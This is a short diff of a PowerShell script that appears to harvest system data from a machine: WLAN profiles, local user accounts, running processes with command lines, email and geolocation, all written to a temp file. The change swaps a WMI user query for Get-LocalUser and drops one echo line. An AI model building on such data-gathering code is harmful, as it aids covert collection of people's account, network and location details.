@@ -151,7 +151,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
 ############################################################################################################################################################
 
 # local-user
-$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID
+$luser=Get-LocalUser
 
 # process first
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
@@ -207,7 +207,6 @@ echo "Email:" >> $FileName
 echo "==================================================================" >> $FileName
 echo $EM >> $env:TMP\$FileName
 echo "" >> $env:TMP\$FileName
-echo "GeoLocation:" >> $env:TMP\$FileName
 echo "==================================================================" >> $FileName
 echo $GL >> $FileName
 echo "" >> $FileName
